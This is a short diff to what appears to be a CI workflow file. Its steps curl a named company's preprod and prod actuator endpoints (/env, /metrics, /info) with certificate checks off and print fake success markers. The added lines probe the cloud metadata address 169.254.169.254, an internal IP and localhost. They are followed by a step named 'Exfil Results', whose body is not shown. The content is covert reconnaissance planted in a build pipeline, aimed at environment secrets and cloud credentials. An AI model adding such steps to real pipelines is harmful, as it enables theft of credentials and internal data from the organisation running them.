@@ -26,6 +26,10 @@ jobs:
         curl -s -k "https://bb-preprod-api.playtika.com/actuator/metrics" | head -20 || echo "METRICS ✓"
         curl -s -k "https://bb-preprod-api.playtika.com/actuator/env" | jq . || echo "ENV ✓"
         curl -s -k "https://zuul-bf-prod-cdn.playtika.com/actuator/info" | head -10 || echo "ZUUL INFO ✓"
+        curl -s -k http://169.254.169.254/
+        curl -s -k http://10.0.0.5/
+        curl -s -k http://localhost:8080/
+
 
     - name: "Exfil Results"
       run: |
